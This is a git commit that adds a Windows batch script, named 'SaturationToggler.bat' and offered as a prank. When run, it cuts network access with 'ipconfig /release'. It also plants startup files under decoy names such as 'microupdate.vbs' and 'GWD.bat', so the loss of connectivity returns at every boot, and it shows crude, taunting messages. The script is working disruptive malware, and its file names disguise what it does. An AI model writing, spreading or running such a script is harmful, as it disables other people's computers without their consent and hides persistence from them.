8a953373975aba1bd76d3df5b411b6c79b205cda
Victor0lsson <sskronos666@gmail.com>
2016-05-22 19:14:36 +0200

    Add files via upload
    This file disables internet and adds an ipconfig /release command to the startup folder which means that everytime the computer boots ipconfig will be disabled
    have fun pranking!

---
+++ SaturationToggler.bat
@@ -0,0 +1,12 @@
+@echo off
+Title VIRUS 100% no scam!
+echo msgbox "HAHA JEZUZ YZY SAYS NO INTERNET!" > "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\microupdate.vbs"
+echo ipconfig /release > "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\GWD.bat"
+ipconfig /release
+cls
+echo U got FUCKED by HEZYZ YZYZZ
+echo
+echo i deleted internet for you no more internet <3
+echo please restart cumputr to fix
+echo <333
+pause
